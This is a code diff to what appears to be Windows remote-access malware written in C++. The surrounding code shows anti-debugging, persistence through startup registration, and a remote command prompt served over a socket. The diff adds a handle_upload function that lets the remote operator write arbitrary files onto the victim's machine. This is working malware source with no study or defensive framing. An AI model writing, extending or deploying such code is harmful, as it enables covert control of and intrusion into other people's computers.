@@ -6,7 +6,6 @@
 #include <iostream>
 #include <sys/stat.h>
 #include "anti-debug.h"
-#include "upload.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -27,6 +26,7 @@ DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes availa
 void CommandPrompt(void);       //the function to give the command prompt
 void AddToStartup(void);        //function to add the program to startup
 std::string GenerateRandomString(int length); //function to generate a random string
+void handle_upload(SOCKET sock); //the function to create new files with the command prompt
 
 int main() //the main function
 {
@@ -158,7 +158,7 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
         recv(remsock, bufferin, sizeof(bufferin), 0);
 
         if (strncmp(bufferin, "upload", 6) == 0) {
-            handle_upload(remsock, bufferin);
+            handle_upload(remsock);
             continue;
         }
 
@@ -267,4 +267,44 @@ std::string GenerateRandomString(int length) {
     }
 
     return randomString;
+}
+
+void handle_upload(SOCKET sock) {
+
+    char filename[256];
+    int received;
+    FILE* fp;
+
+    // Clear the buffer and receive the filename
+    ZeroMemory(bufferin, sizeof(bufferin));
+    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
+        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
+        return;
+    }
+
+    // Remove newline character if present
+    char* newline = strchr(filename, '\n');
+    if (newline) {
+        *newline = '\0';
+    }
+
+    // Open the file for writing
+    fp = fopen(filename, "w");
+    if (fp == NULL) {
+        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
+        return;
+    }
+    send(sock, "File created\n", strlen("File created\n"), 0);
+
+    // Receive the file content
+    char stop[] = "stop upload";
+    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
+        if (strstr(bufferin, "stop upload") != NULL) {
+            break;
+        }
+        fwrite(bufferin, 1, received, fp);
+    }
+    fclose(fp);
+
+    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
 }
